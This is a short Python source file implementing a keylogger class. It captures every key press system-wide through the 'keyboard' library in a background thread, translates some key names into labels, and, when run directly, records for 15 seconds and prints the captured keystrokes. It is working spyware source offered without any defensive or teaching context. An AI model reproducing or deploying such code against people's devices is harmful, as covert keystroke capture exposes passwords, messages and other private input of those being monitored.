from sys import stderr
from threading import Thread, Lock
import keyboard
import time

# Translation Table
TRANSLATION_TABLE = {
    "space":" ",
    "ctrl":"'CTRL'",
    "shift":"'SHIFT",
    "tab":"'TAB'",
    "enter":"'ENTER'",
    "backspace":"\b",
    "alt":"'ALT'"
}


class Keylogger:


    def __init__(self):
        # This stores every key press.
        self.__keylog = ""
        self.__stop = False
        self.__thread = None
        self.__lock = Lock()
    

    def __read_keystrokes(self):
        while not self.__stop:
            event = keyboard.read_event()
            if event.event_type == "down":
                try:
                    temp = TRANSLATION_TABLE[event.name]
                    self.__lock.acquire()
                    self.__keylog += temp
                    self.__lock.release()
                except KeyError:
                    self.__lock.acquire()
                    self.__keylog += event.name
                    self.__lock.release()


    def start(self):
        if self.__thread is not None:
            print("ERROR: Calling start() on keylogger that is already running.", file=stderr)
            exit(1)
        self.__thread = Thread(target=self.__read_keystrokes)
        self.__thread.start()


    def stop(self):
        if self.__thread is None:
            print("ERROR: Calling stop() on keylogger that is not running.", file=stderr)
            exit(1)
        self.__stop = True
    

    def get_keylog(self):
        keylog = ""
        self.__lock.acquire()
        keylog = self.__keylog
        self.__lock.release()
        return keylog


if __name__ == "__main__":
    k = Keylogger()
    k.start()
    time.sleep(15)
    k.stop()
    print(k.get_keylog())